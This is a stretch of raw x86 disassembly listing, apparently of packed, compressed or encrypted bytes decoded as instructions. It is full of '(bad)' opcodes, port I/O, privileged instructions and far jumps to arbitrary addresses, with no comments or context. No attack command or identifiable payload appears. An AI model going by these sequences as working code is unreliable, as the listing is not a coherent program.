  4254df:	add    BYTE PTR [eax],al
  4254e1:	add    BYTE PTR [ebp-0x5009abd0],bl
  4254e7:	xor    DWORD PTR [edx],ebx
  4254e9:	out    dx,eax
  4254ea:	or     esi,DWORD PTR [ebp+0x5]
  4254ed:	arpl   WORD PTR [ecx-0x5d],ax
  4254f0:	mov    cs,WORD PTR [eax]
  4254f2:	sar    BYTE PTR [edx],cl
  4254f4:	pop    edx
  4254f5:	lds    ebx,FWORD PTR [esi-0x403e0082]
  4254fb:	into   
  4254fc:	bound  ecx,QWORD PTR es:[edx+0x19]
  425500:	cmp    eax,ebp
  425502:	xchg   ebx,eax
  425503:	mov    dl,0x98
  425505:	sub    eax,0xedf9b878
  42550a:	or     al,0x5e
  42550c:	xor    dh,ch
  42550e:	or     al,0x8e
  425510:	xor    cl,BYTE PTR [ecx]
  425512:	xchg   esp,eax
  425513:	das    
  425514:	jp     0x42551b
  425516:	inc    esp
  425517:	sbb    dl,BYTE PTR ds:0xd40b51b7
  42551d:	daa    
  42551e:	xchg   ebx,eax
  42551f:	pop    es
  425520:	cwde   
  425521:	jmp    0x425539
  425523:	repnz popa 
  425525:	(bad)  
  425526:	adc    al,0xfc
  425528:	in     al,dx
  425529:	mov    ecx,0xe361f217
  42552e:	add    eax,0x12cd0574
  425533:	mov    dh,0xf
  425535:	jno    0x425591
  425537:	mov    ds:0x32992798,eax
  42553c:	out    dx,eax
  42553d:	out    dx,al
  42553e:	or     esi,DWORD PTR [esi+0x32]
  425541:	cli    
  425542:	sub    BYTE PTR ds:0xf20c,0x0
  425549:	add    BYTE PTR [eax],al
  42554b:	xchg   ebx,eax
  42554c:	mov    dl,0x99
  42554e:	mov    ebp,0x1255a2f7
  425553:	push   eax
  425554:	into   
  425555:	cmp    al,BYTE PTR [eax]
  425557:	(bad)  
  425558:	das    
  425559:	mov    ds:0x94f186fd,al
  42555e:	dec    esp
  42555f:	lea    ebx,[edx]
  425561:	xchg   edx,eax
  425562:	leave  
  425563:	std    
  425564:	adc    al,0x94
  425566:	pop    edx
  425567:	mov    eax,ds:0xda74c52f
  42556c:	xor    eax,0x35682bd1
  425571:	mov    edi,0xe8e43250
  425576:	sar    esp,cl
  425578:	out    dx,al
  425579:	popa   
  42557a:	or     al,BYTE PTR [ebx]
  42557c:	jns    0x42557f
  42557e:	and    al,0xea
  425580:	mov    ds:0xab2f87ed,al
  425585:	loopne 0x4255cd
  425587:	outs   dx,BYTE PTR ds:[esi]
  425588:	jae    0x4255a3
  42558a:	test   DWORD PTR [edi],esp
  42558c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42558d:	push   cs
  42558e:	add    dl,dh
  425590:	jne    0x4255c4
  425592:	sbb    al,0xf2
  425594:	ins    DWORD PTR es:[edi],dx
  425595:	xor    dl,BYTE PTR [esp+edi*4]
  425598:	clc    
  425599:	popa   
  42559a:	cs ret 0x1a69
  42559e:	test   DWORD PTR [edx],esp
  4255a0:	mov    esi,0x16ee8b31
  4255a5:	into   
  4255a6:	mov    ebp,eax
  4255a8:	popa   
  4255a9:	xchg   ebp,eax
  4255aa:	into   
  4255ab:	push   es
  4255ac:	fist   WORD PTR [edx+0xc0]
  4255b2:	add    BYTE PTR [eax],al
  4255b4:	jge    0x42556a
  4255b6:	xchg   esp,eax
  4255b7:	inc    esi
  4255b8:	push   ds
  4255b9:	push   cs
  4255ba:	xchg   ecx,eax
  4255bb:	or     al,0xfd
  4255bd:	cmp    DWORD PTR [eax+0x17],edx
  4255c0:	jg     0x42563d
  4255c2:	add    DWORD PTR [edi-0xa],edi
  4255c5:	sub    al,0xb6
  4255c7:	push   cs
  4255c8:	jmp    0x9d86eb7e
  4255cd:	stos   BYTE PTR es:[edi],al
  4255ce:	xchg   ebp,eax
  4255cf:	dec    esp
  4255d0:	lea    edx,[esi]
  4255d2:	xchg   edx,eax
  4255d3:	leave  
  4255d4:	nop
  4255d5:	out    0xfa,eax
  4255d7:	xchg   BYTE PTR [eax],bh
  4255d9:	sete   bh
  4255dc:	inc    esp
  4255dd:	mov    eax,0xda7bc39b
  4255e2:	call   0xe3fb:0xbf9060d1
  4255e9:	mov    ss,ecx
  4255eb:	je     0x425587
  4255ed:	adc    DWORD PTR [edi+0x13],0xfe1d996c
  4255f4:	pop    ss
  4255f5:	push   esi
  4255f6:	push   es
  4255f7:	repnz dec esi
  4255f9:	cld    
  4255fa:	dec    ebp
  4255fb:	or     edx,DWORD PTR ds:0x90ffff89
  425601:	sbb    BYTE PTR [ebp+0x24],0xb0
  425605:	xchg   esi,eax
  425606:	fdiv   DWORD PTR [esi+eiz*4-0x70]
  42560a:	dec    ebp
  42560b:	and    al,0x84
  42560d:	or     BYTE PTR [ecx+0x14],0xd
  425611:	lock and eax,0xf9540b1f
  425617:	rol    BYTE PTR [eax],0x0
  42561a:	add    BYTE PTR [eax],al
  42561c:	add    BYTE PTR [ebx],cl
  42561e:	dec    edx
  42561f:	inc    edx
  425620:	xchg   DWORD PTR [esi-0x14],ebx
  425623:	rol    BYTE PTR [ebp-0x79e740b0],0xd6
  42562a:	in     al,0xf4
  42562c:	add    DWORD PTR [ebp+ecx*1+0x25874299],0x14a71354
  425637:	xchg   esi,eax
  425638:	cmp    al,0x8e
  42563a:	sbb    edx,DWORD PTR [ecx]
  42563c:	xchg   esp,ecx
  42563e:	out    dx,eax
  42563f:	in     al,dx
  425640:	pop    edx
  425641:	outs   dx,BYTE PTR ds:[esi]
  425642:	into   
  425643:	dec    ecx
  425644:	jg     0x425612
  425646:	out    dx,al
  425647:	into   
  425648:	or     BYTE PTR [eax+0xabf630c],dl
  42564e:	fwait
  42564f:	ret    0x505b
  425652:	mov    dl,0xf7
  425654:	xchg   eax,edx
  425656:	mov    ah,0x73
  425658:	stos   DWORD PTR es:[edi],eax
  425659:	lea    esi,[edx-0x31cb7509]
  42565f:	adc    ecx,DWORD PTR [ecx-0x3b6a4b19]
  425665:	fwait
  425666:	outs   dx,BYTE PTR ds:[esi]
  425667:	or     al,0x8d
  425669:	pop    esp
  42566a:	into   
  42566b:	sbb    eax,esi
  42566d:	push   edx
  42566e:	mov    cl,0xf7
  425670:	lds    edx,FWORD PTR [edx-0x4d]
  425673:	lds    eax,FWORD PTR [edx-0x107c6f48]
  425679:	push   ds
  42567a:	sbb    dh,dl
  42567c:	aaa    
  42567d:	jp     0x4256b0
  42567f:	invd   
  425681:	add    BYTE PTR [eax],al
  425683:	add    BYTE PTR [eax],al
  425685:	add    BYTE PTR [ebx+eiz*4],al
  425688:	lahf   
  425689:	push   cs
  42568a:	or     eax,0x9003de50
  42568f:	in     al,dx
  425690:	mov    esp,0x30198801
  425695:	mov    esi,0x45bd046b
  42569a:	lods   ax,WORD PTR ds:[esi]
  42569c:	mov    esi,0xc4045ac1
  4256a1:	(bad)
  4256a4:	repnz lods al,BYTE PTR ds:[esi]
  4256a6:	or     DWORD PTR ds:0x6d52bed4,eax
  4256ac:	stc    
  4256ad:	add    al,0x29
  4256af:	inc    ebx
  4256b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4256b1:	mov    esi,0x534ed3b
  4256b6:	arpl   WORD PTR [ecx],bx
  4256b8:	pop    esp
  4256b9:	mov    ebp,0x75fc042b
  4256be:	shl    BYTE PTR [eax-0x6ef2d8f],cl
  4256c4:	(bad)  
  4256c5:	or     BYTE PTR [eax],0xb6
  4256c8:	in     al,0x8e
  4256ca:	jmp    0x8b464e81
  4256cf:	cs push cs
  4256d1:	push   esp
  4256d2:	xchg   ebx,eax
  4256d3:	mov    dl,0xe
  4256d5:	push   0x3b
  4256d7:	mov    bl,0x1d
  4256d9:	ins    DWORD PTR es:[edi],dx
  4256da:	adc    DWORD PTR [ecx],ecx
  4256dc:	in     eax,dx
  4256dd:	pop    esi
  4256de:	test   eax,0xd20248b9
  4256e3:	mov    bh,0x92
  4256e5:	(bad)  
  4256e6:	or     eax,0xb1ed08
  4256eb:	add    BYTE PTR [eax],al
  4256ed:	add    BYTE PTR [eax],al
  4256ef:	jg     0x425690
  4256f1:	push   esi
  4256f2:	out    dx,al
  4256f3:	pop    ss
  4256f4:	xchg   esi,eax
  4256f5:	in     al,dx
  4256f6:	imul   BYTE PTR ss:[ebx]
  4256f9:	push   edx
  4256fa:	add    eax,0xe8543a8c
  4256ff:	int    0x70
  425701:	adc    cl,ch
  425703:	in     al,dx
  425704:	gs in  al,dx
  425706:	push   ss
  425707:	(bad)  
  425708:	xor    ch,cl
  42570a:	leave  
  42570b:	sahf   
  42570c:	cs inc edx
  42570e:	pop    es
  42570f:	inc    esi
  425710:	pop    es
  425711:	cdq    
  425712:	lods   eax,DWORD PTR ds:[esi]
  425713:	ja     0x4256b0
  425715:	sub    BYTE PTR [eax],dl
  425717:	xchg   BYTE PTR [esi],dh
  425719:	aas    
  42571a:	fcom   QWORD PTR [ebx+0x6be28eb2]
  425720:	mov    eax,0xb28f319d
  425725:	push   cs
  425726:	inc    ebx
  425727:	mov    WORD PTR [edi-0x53855554],?
  42572d:	in     eax,dx
  42572e:	aas    
  42572f:	mov    al,ds:0x86becfcb
  425734:	mov    edx,0x2b546287
  425739:	clc    
  42573a:	shl    DWORD PTR [ebp-0x6f16f0f5],0xea
  425741:	add    BYTE PTR [ebx-0x19e566e7],dl
  425747:	adc    DWORD PTR [ebx+ebx*1+0x177f93e9],esi
  42574e:	add    dl,dl
  425750:	fs push ss
  425752:	sldt   WORD PTR [eax]
  425755:	add    BYTE PTR [eax],al
  425757:	add    BYTE PTR [ebx-0x53],ch
  42575a:	sbb    eax,DWORD PTR [eax]
  42575c:	jmp    0x3466049a
  425761:	xor    esi,esp
  425763:	(bad)  
  425764:	fisubr WORD PTR [edx]
  425766:	in     al,0xc
  425768:	jmp    0xedb0ef1b
  42576d:	cmp    DWORD PTR [edx+0x24],edi
  425770:	mov    eax,ds:0x43084837
  425775:	bound  esi,QWORD PTR [edx]
  425777:	adc    esp,DWORD PTR [eax+0x54]
  42577a:	jmp    0x42577b
  42577c:	jle    0x4257c2
  42577e:	push   eax
  42577f:	add    esi,DWORD PTR [ebx]
  425781:	je     0x425770
  425783:	jg     0x4257f5
  425785:	lods   eax,DWORD PTR ds:[esi]
  425786:	popa   
  425787:	and    eax,0x3acf7cae
  42578c:	sbb    DWORD PTR [esi],esi
  42578e:	fwait
  42578f:	inc    eax
  425790:	jns    0x42575b
  425792:	add    al,0x8b
  425794:	and    eax,0x9080011a
  425799:	mov    eax,0xa3454c94
  42579e:	sbb    DWORD PTR [ebp-0x16be4e],eax
  4257a4:	aaa    
  4257a5:	js     0x425793
  4257a7:	cmovo  esi,esp
  4257aa:	jmp    0x3902:0x4ff83eff
  4257b1:	dec    ebx
  4257b2:	iret   
  4257b3:	adc    DWORD PTR [ecx-0x50],0x62
  4257b7:	dec    edx
  4257b8:	stos   BYTE PTR es:[edi],al
  4257b9:	cmp    eax,0x7419
  4257be:	add    BYTE PTR [eax],al
  4257c0:	add    BYTE PTR [ebx+esi*1-0x32],dl
  4257c4:	lock mov edx,0xb60eec3d
  4257ca:	or     al,ch
  4257cc:	(bad)  
  4257cd:	(bad)  
  4257ce:	sub    al,BYTE PTR [edx+0x24]
  4257d1:	nop
  4257d2:	push   DWORD PTR [edi+0x110b985f]
  4257d8:	cli    
  4257d9:	dec    esi
  4257da:	or     al,0x97
  4257dc:	dec    edx
  4257dd:	xchg   ebx,eax
  4257de:	mov    ebp,DWORD PTR [eax+0x1a1b7f05]
  4257e4:	mov    dl,0xd1
  4257e6:	inc    ebp
  4257e7:	sbb    DWORD PTR [ebp+edx*1-0x2a8aeeb4],0x7c244584
  4257f2:	mov    ebp,DWORD PTR [eax-0xadfe5fc]
  4257f8:	push   cs
  4257f9:	xchg   edi,eax
  4257fa:	mov    fs,WORD PTR [ebx]
  4257fc:	std    
  4257fd:	mov    edi,0x9242d3c0
  425802:	fnsave [edi-0x552f5293]
  425808:	cli    
  425809:	dec    esi
  42580a:	or     al,0x97
  42580c:	dec    edx
  42580d:	xchg   ebx,eax
  42580e:	mov    ebp,DWORD PTR [eax+0x1a6b1f06]
  425814:	mov    dl,0x51
  425816:	in     eax,0x80
  425818:	nop
  425819:	adc    eax,0x2575114b
  42581e:	test   BYTE PTR [ebp+0x24],al
  425821:	pushf  
  425822:	xor    eax,0x5818
  425827:	add    BYTE PTR [eax],al
  425829:	add    BYTE PTR [edx-0x53b3682d],ch
  42582f:	cld    
  425830:	pop    ss
  425831:	test   esp,edx
  425833:	fisubr WORD PTR [eax-0x46051505]
  425839:	dec    esi
  42583a:	xchg   edi,eax
  42583b:	or     edx,DWORD PTR [ecx]
  42583d:	jg     0x425803
  42583f:	scas   eax,DWORD PTR es:[edi]
  425840:	push   es
  425841:	add    BYTE PTR [esi-0x27],dl
  425844:	adc    ebp,DWORD PTR [esi]
  425846:	sub    DWORD PTR [ebx],ebx
  425848:	sbb    al,BYTE PTR [eax]
  42584a:	nop
  42584b:	pop    ecx
  42584c:	push   eax
  42584d:	add    DWORD PTR [edi-0x4e],esi
  425850:	jle    0x425834
  425852:	sbb    al,0x1
  425854:	mov    WORD PTR [edi+0xa3d0a4a],cs
  42585a:	nop
  42585b:	mov    dl,0x72
  42585d:	les    edi,FWORD PTR [eax+esi*4+0x6d]
  425861:	add    bh,bh
  425863:	mov    dh,bl
  425865:	pop    ebx
  425866:	outs   dx,BYTE PTR ds:[esi]
  425867:	mov    ds:0xf3540afe,eax
  42586c:	pop    DWORD PTR [edi]
  42586e:	mov    bh,0xf2
  425870:	mov    dh,0x8e
  425872:	inc    esp
  425873:	(bad)  
  425874:	jecxz  0x425801
  425876:	push   edx
  425877:	mov    bl,0x70
  425879:	inc    esi
  42587a:	test   al,0x37
  42587c:	aaa    
  42587d:	or     ecx,DWORD PTR [esi*2+0x2d9003f6]
  425884:	cmp    eax,0x3736e0bb
  425889:	or     edx,DWORD PTR [edx+ebx*8]
  42588c:	cmp    bh,BYTE PTR [ebx+0x0]
  425892:	add    BYTE PTR [ebx+0x7412bd2b],ch
  425898:	cmp    ebx,edi
  42589a:	add    ch,BYTE PTR [ecx-0x7444fd16]
  4258a0:	xor    eax,DWORD PTR [eax]
  4258a2:	or     DWORD PTR [ebx+0x7bb80c36],ebx
  4258a8:	add    BYTE PTR [edi-0x41],dh
  4258ab:	mov    gs,WORD PTR [edi+0x6cca7b]
  4258b1:	cld    
  4258b2:	(bad)  
  4258b3:	shl    BYTE PTR [edi-0x537371e5],cl
  4258b9:	mov    esi,0xf7b2845b
  4258be:	add    DWORD PTR [edi+0x67],0x42
  4258c2:	push   cs
  4258c3:	push   cs
  4258c4:	mov    ecx,0xb18cb91b
  4258c9:	pop    edi
  4258ca:	add    DWORD PTR [edi],ebp
  4258cc:	pushw  cs
  4258ce:	imul   ebp,esi,0x4f641d75
  4258d4:	mov    eax,0xd513e90e
  4258d9:	jmp    0x51af:0x10a4d1a7
  4258e0:	dec    DWORD PTR [esi]
  4258e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4258e3:	push   ecx
  4258e4:	mov    cl,0x0
  4258e6:	nop
  4258e7:	and    edi,edi
  4258e9:	in     al,dx
  4258ea:	jle    0x4258ff
  4258ec:	aad    0x11
  4258ee:	push   0x59
  4258f0:	stos   BYTE PTR es:[edi],al
  4258f1:	in     eax,dx
  4258f2:	push   0x59
  4258f4:	scas   al,BYTE PTR es:[edi]
  4258f5:	in     eax,dx
  4258f6:	imul   eax,DWORD PTR [eax],0x0
  4258fc:	push   ds
  4258fd:	mov    ecx,0xfe41651d
  425902:	in     al,dx
  425903:	push   esi
  425904:	adc    ecx,DWORD PTR [eax]
  425906:	sbb    ebx,esi
  425908:	inc    edi
  425909:	ins    DWORD PTR es:[edi],dx
  42590a:	jmp    0x8ab1:0xe932fa46
  425911:	xor    eax,0xb293e280
  425916:	aam    0xa7
  425918:	mov    WORD PTR [ebp-0x4181d09],?
  42591e:	in     al,dx
  42591f:	imul   edx,esi,0xfe6c1d66
  425925:	mov    cl,0xe
  425927:	jmp    0xef51cd7d
  42592c:	sub    al,0x65
  42592e:	jmp    0x9a9d:0xe93239fe
  425935:	xor    eax,0xb293e887
  42593a:	aam    0x2f
  42593c:	xchg   ebx,eax
  42593d:	mov    bl,0xf7
  42593f:	sub    bl,BYTE PTR [eax]
  425941:	sti    
  425942:	in     al,dx
  425943:	imul   ecx,DWORD PTR ds:0x11641d62,0x29000eb1
  42594d:	icebp  
  42594e:	dec    edi
  42594f:	add    DWORD PTR [ecx+0x4c],eax
  425952:	pop    ds
  425953:	cld    
  425954:	out    0x38,al
  425956:	mov    ?,ebx
  425958:	es stos BYTE PTR es:[edi],al
  42595a:	xchg   ebx,eax
  42595b:	jne    0x425985
  42595d:	mov    bl,0xe
  42595f:	push   0x0
  425961:	add    BYTE PTR [eax],al
  425963:	add    BYTE PTR [eax],al
  425965:	and    BYTE PTR [ebx-0x6a],bl
  425968:	inc    esi
  425969:	clc    
  42596a:	dec    ebx
  42596b:	or     edi,esp
  42596d:	push   ss
  42596e:	cmp    DWORD PTR [ebx+0x15fa1943],ebx
  425974:	movd   mm0,DWORD PTR [edi]
  425977:	adc    al,0x0
  425979:	stc    
  42597a:	rcr    BYTE PTR [ecx],1
  42597c:	mov    esi,0x4435d43a
  425981:	lea    ebx,[esi-0x5317b930]
  425987:	jo     0x425912
  425989:	jmp    DWORD PTR [edx+0x3962fcf7]
  42598f:	jmp    0x624eac14
  425994:	or     DWORD PTR [edi+0x74],ebp
  425997:	ud2    
  425999:	push   eax
  42599a:	dec    esp
  42599b:	in     eax,0xff
  42599d:	jbe    0x42599f
  42599f:	dec    ecx
  4259a0:	and    al,0x91
  4259a2:	test   eax,0xb2a20f9a
  4259a7:	push   cs
  4259a8:	and    BYTE PTR [edx+0x6f8f17f9],0xaf
  4259af:	push   cs
  4259b0:	add    BYTE PTR [edi],cl
  4259b2:	das    
  4259b3:	pop    eax
  4259b4:	adc    BYTE PTR [edi],cl
  4259b6:	iret   
  4259b7:	xlat   BYTE PTR ds:[ebx]
  4259b8:	or     bl,BYTE PTR [edi]
  4259ba:	stos   DWORD PTR es:[edi],eax
  4259bb:	test   al,0xc3
  4259bd:	movzx  edx,si
  4259c0:	data16 sub BYTE PTR [edx+0x32],0x18
  4259c5:	iret   
  4259c6:	sub    DWORD PTR [eax+0x10],ebx
  4259c9:	add    BYTE PTR [eax],al
  4259cb:	add    BYTE PTR [eax],al
  4259cd:	add    BYTE PTR [eax+0x47ffae23],dl
  4259d3:	or     al,0x2f
  4259d5:	aaa    
  4259d6:	dec    eax
  4259d7:	add    eax,0xb8ae08e
  4259dc:	adc    DWORD PTR [esi-0x16fc5024],eax
  4259e2:	hlt    
  4259e3:	inc    eax
  4259e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4259e5:	sti    
  4259e6:	or     eax,0x893cc2c9
  4259eb:	or     al,0x8e
  4259ed:	int3   
  4259ee:	call   0xd26d:0x9762110b
  4259f5:	bound  ebp,QWORD PTR [ebx-0x31e81131]
  4259fb:	aad    0x11
  4259fd:	or     al,0x76
  4259ff:	xchg   edx,eax
  425a00:	dec    edi
  425a01:	push   cs
  425a02:	stc    
  425a03:	nop
  425a04:	stos   BYTE PTR es:[edi],al
  425a05:	sti    
  425a06:	fisttp WORD PTR [ebx+0x25d20aa]
  425a0c:	iret   
  425a0d:	inc    edx
  425a0e:	xchg   ecx,eax
  425a0f:	push   ss
  425a10:	mov    eax,0xa66ccb7d
  425a15:	ss pop esp
  425a17:	scas   eax,DWORD PTR es:[edi]
  425a18:	or     cl,BYTE PTR [ebx]
  425a1a:	add    al,0x5e
  425a1c:	sbb    eax,DWORD PTR [eax]
  425a1e:	nop
  425a1f:	mov    ebp,DWORD PTR [edx-0x63a368c7]
  425a25:	push   es
  425a26:	nop
  425a27:	or     ebp,DWORD PTR [edi]
  425a29:	xchg   DWORD PTR [esi-0x7],eax
  425a2c:	cs addr16 pop ecx
  425a2f:	adc    DWORD PTR [edi],ebp
  425a31:	or     eax,DWORD PTR [eax]
  425a33:	add    BYTE PTR [eax],al
  425a35:	add    BYTE PTR [eax],al
  425a37:	inc    esi
  425a38:	enter  0xff2f,0x57
  425a3c:	sub    eax,0x13ac4bfa
  425a41:	das    
  425a42:	mov    esi,ebx
  425a44:	fnstcw WORD PTR [ecx-0x3eb7ea73]
  425a4a:	cmp    al,0x89
  425a4c:	mov    dl,0x4c
  425a4e:	push   cs
  425a4f:	repnz lods eax,DWORD PTR ds:[esi]
  425a51:	(bad)  
  425a52:	ret    
  425a53:	mov    dl,0xc9
  425a55:	cmp    esp,eax
  425a57:	lahf   
  425a58:	hlt    
  425a59:	xor    al,0x5
  425a5b:	mov    dl,BYTE PTR [esi+ebx*2-0x17f463c2]
  425a62:	mov    edx,0xbb76fd2b
  425a67:	jo     0x425a16
  425a69:	jae    0x425a55
  425a6b:	es std 
  425a6d:	mov    bl,0x8a
  425a6f:	shl    BYTE PTR [ebp-0x5163782d],cl
  425a75:	mov    ?,WORD PTR [eax-0x72]
  425a78:	mov    dl,0xf7
  425a7a:	mov    BYTE PTR [edi-0x7cf32d1e],bh
  425a80:	aad    0x15
  425a82:	mov    ebx,DWORD PTR [edx-0x5a]
  425a85:	sbb    eax,0x15a7d92b
  425a8a:	pop    es
  425a8b:	sbb    dh,cl
  425a8d:	fadd   QWORD PTR [edx]
  425a8f:	enter  0x93,0x48
  425a93:	je     0x425a2f
  425a95:	jg     0x425a36
  425a97:	(bad)  
  425a98:	cld    
  425a99:	neg    BYTE PTR ds:0x0
  425a9f:	add    BYTE PTR [ecx],cl
  425aa1:	ins    BYTE PTR es:[edi],dx
  425aa2:	retf   
  425aa3:	sbb    eax,0xcaa3ea7f
  425aa8:	mov    ecx,0xabb724b8
  425aad:	xor    DWORD PTR [eax],esp
  425aaf:	or     ah,BYTE PTR [eax+ecx*8]
  425ab2:	ja     0x425a6f
  425ab4:	test   DWORD PTR [esi-0x2c787c18],eax
  425aba:	mov    ch,BYTE PTR [esi+0x52]
  425abd:	jne    0x425ab5
  425abf:	push   es
  425ac0:	imul   ebx,ebx,0x337bb710
  425ac6:	adc    BYTE PTR [ecx],cl
  425ac8:	in     eax,0xa9
  425aca:	push   cs
  425acb:	das    
  425acc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425acd:	mov    cl,0xfe
  425acf:	dec    DWORD PTR [edx+0x5]
  425ad2:	in     eax,dx
  425ad3:	out    0x13,al
  425ad5:	add    al,0x18
  425ad7:	out    dx,al
  425ad8:	adc    dl,dh
  425ada:	out    0xd6,eax
  425adc:	(bad)  
  425add:	lock push ebx
  425adf:	call   0xc3e8660c
  425ae4:	(bad)  
  425ae5:	test   DWORD PTR [ebp-0x1f79663e],0x329f6563
  425aef:	push   ebx
  425af0:	xchg   edi,eax
  425af1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425af2:	mul    esp
  425af4:	mov    DWORD PTR [edx-0x51b596f2],esi
  425afa:	sbb    eax,0xed051d6d
  425aff:	mov    ss,WORD PTR [ebx]
  425b01:	add    al,0x18
  425b03:	test   BYTE PTR [eax],0x0
  425b06:	add    BYTE PTR [eax],al
  425b08:	add    BYTE PTR [edi+0x25],dh
  425b0b:	call   0x3475818e
  425b10:	jmp    0x6912:0x6e166912
  425b17:	sbb    ah,BYTE PTR [esi+0x9]
  425b1a:	cmp    al,0x1a
  425b1c:	or     eax,ecx
  425b1e:	xchg   edx,eax
  425b1f:	sbb    eax,0xea9416b
  425b24:	jmp    0x6e5fe0f0
  425b29:	sub    DWORD PTR [ecx+0x3896e90e],ebp
  425b2f:	shr    DWORD PTR [edi],1
  425b31:	mov    al,gs:0xfb5d270e
  425b37:	or     eax,0x6d68db6a
  425b3c:	mov    bl,0xbf
  425b3e:	mov    esp,0x86d20191
  425b43:	and    eax,0x91c8afa1
  425b48:	add    BYTE PTR [ecx+0x212362b0],ah
  425b4e:	retf   
  425b4f:	add    al,0x83
  425b51:	xchg   ecx,eax
  425b52:	sti    
  425b53:	pusha  
  425b54:	or     eax,0x7c93b431
  425b59:	pusha  
  425b5a:	scas   eax,DWORD PTR es:[edi]
  425b5b:	push   cs
  425b5c:	(bad)  
  425b5d:	ja     0x425b0b
  425b5f:	adc    al,0xeb
  425b61:	fmul   st,st(0)
  425b63:	pop    ss
  425b64:	pop    eax
  425b65:	mov    cl,0xbc
  425b67:	add    bl,ch
  425b69:	jo     0x425ba7
  425b6b:	push   eax
  425b6c:	push   ss
  425b6d:	add    BYTE PTR [eax],al
  425b6f:	add    BYTE PTR [eax],al
  425b71:	add    BYTE PTR [ebx],bh
  425b73:	dec    edx
  425b74:	pop    ebp
  425b75:	(bad)  
  425b76:	ja     0x425b24
  425b78:	por    mm7,QWORD PTR [esp+edi*1+0x50]
  425b7d:	push   ss
  425b7e:	sub    DWORD PTR [edx+0x51],ecx
  425b81:	(bad)  
  425b82:	mov    bh,0xac
  425b84:	adc    ebp,ebx
  425b86:	mov    eax,0x416503c
  425b8b:	dec    edx
  425b8c:	and    eax,0x62752183
  425b91:	xor    ah,BYTE PTR [ecx-0x4eb7c83e]
  425b97:	ret    0x4809
  425b9a:	in     eax,0xac
  425b9c:	push   esi
  425b9d:	je     0x425b7b
  425b9f:	sbb    WORD PTR [ebp+0xea7a6],ax
  425ba6:	ja     0x425b64
  425ba8:	add    BYTE PTR [edi],cl
  425baa:	push   edx
  425bab:	call   0x16f3:0xfdd746d0
  425bb2:	ja     0x425b70
  425bb4:	add    BYTE PTR [esi],dl
  425bb6:	push   edx
  425bb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425bb8:	rol    BYTE PTR [esi-0x39],1
  425bbb:	sahf   
  425bbc:	cmc    
  425bbd:	or     ah,BYTE PTR [edi-0x44]
  425bc0:	add    BYTE PTR [ebx],al
  425bc2:	mov    ds:0x9046d0b2,al
  425bc7:	stc    
  425bc8:	jmp    0x24e8:0xff0ad6c1
  425bcf:	mov    bl,0xa3
  425bd1:	sti    
  425bd2:	adc    al,0xd5
  425bd4:	adc    eax,DWORD PTR [eax+eax*1+0x0]
  425bdb:	mov    WORD PTR [edx],ss
  425bdd:	adc    DWORD PTR [eax],eax
  425bdf:	or     bl,BYTE PTR [edx]
  425be1:	sbb    ecx,DWORD PTR [ebx]
  425be3:	push   ds
  425be4:	dec    ebx
  425be5:	xchg   esi,eax
  425be6:	adc    al,0x15
  425be8:	and    al,0xc
  425bea:	inc    esp
  425beb:	nop
  425bec:	mov    esp,DWORD PTR [esi-0x69013ae0]
  425bf2:	push   0xffffff93
  425bf4:	add    BYTE PTR [ebx-0x3b],bh
  425bf7:	adc    al,bh
  425bf9:	add    BYTE PTR [eax],al
  425bfb:	popf   
  425bfc:	adc    ch,BYTE PTR [ebx-0x48236ebe]
  425c02:	sub    eax,0x86110b91
  425c07:	jle    0x425c15
  425c09:	adc    dh,BYTE PTR [edx+0x1004e5cd]
  425c0f:	(bad)  
  425c10:	pop    DWORD PTR [ebx]
  425c12:	add    DWORD PTR [eax-0x6a066ef5],edx
  425c18:	(bad)  
  425c19:	bnd jg 0x425c01
  425c1c:	or     bh,BYTE PTR [edx+ecx*1]
  425c1f:	adc    BYTE PTR [ebp-0x36768aa7],al
  425c25:	sub    edx,DWORD PTR [edx]
  425c27:	mov    ds:0x9000eb62,al
  425c2c:	or     edx,DWORD PTR [ecx+0x6bd892fd]
  425c32:	push   cs
  425c33:	mov    DWORD PTR [ebx],ecx
  425c35:	adc    DWORD PTR [eax-0x7aede455],eax
  425c3b:	cdq    
  425c3c:	adc    dl,BYTE PTR [ecx]
  425c3e:	add    BYTE PTR [eax],al
  425c40:	add    BYTE PTR [eax],al
  425c42:	add    BYTE PTR [eax],al
  425c44:	(bad)  
  425c45:	push   ecx
  425c46:	sbb    ecx,DWORD PTR [eax]
  425c48:	test   eax,0x900300b2
  425c4d:	mov    dl,0x77
  425c4f:	mov    edx,0x83ad7f8e
  425c54:	jge    0x425c09
  425c56:	sub    bh,0xf7
  425c59:	std    
  425c5a:	mov    ds:0xb4f0992e,eax
  425c5f:	or     eax,0x3080b8f
  425c64:	nop
  425c65:	mov    dl,0x77
  425c67:	mov    dh,0x91
  425c69:	jg     0x425c81
  425c6b:	test   BYTE PTR [edi+0x6f],al
  425c6e:	inc    edx
  425c6f:	std    
  425c70:	push   ecx
  425c71:	jo     0x425c60
  425c73:	push   ss
  425c74:	sub    edx,esi
  425c76:	test   BYTE PTR [ebx],0x90
  425c79:	xor    dl,dl
  425c7b:	add    eax,0xaf77a8a5
  425c80:	jne    0x425d01
  425c82:	out    dx,al
  425c83:	leave  
  425c84:	shl    BYTE PTR [eax-0x4e1a633d],cl
  425c8a:	test   DWORD PTR [ebx],0x2f8f710
  425c90:	or     eax,0x9003ef3b
  425c95:	xor    al,BYTE PTR [eax+0x272f8b45]
  425c9b:	cld    
  425c9c:	out    dx,eax
  425c9d:	clc    
  425c9e:	add    BYTE PTR ds:0x1a3d2a48,dl
  425ca4:	jmp    0x4653ca
  425ca9:	add    BYTE PTR [eax],al
  425cab:	add    BYTE PTR [eax],al
  425cad:	nop
  425cae:	xor    ch,BYTE PTR [esi+0x1a]
  425cb1:	inc    ebp
  425cb2:	call   0x9b7a:0xa991b177
  425cb9:	mov    BYTE PTR [edx+0x6ebf83f7],dh
  425cbf:	in     al,0x88
  425cc1:	sbb    ch,BYTE PTR [edx+0x6fd203f7]
  425cc7:	push   cs
  425cc8:	fist   WORD PTR [ecx-0x1e969eef]
  425cce:	mov    dl,0x63
  425cd0:	rcl    DWORD PTR [ebx],cl
  425cd2:	cli    
  425cd3:	adc    BYTE PTR [eax+edi*2-0x47441688],dl
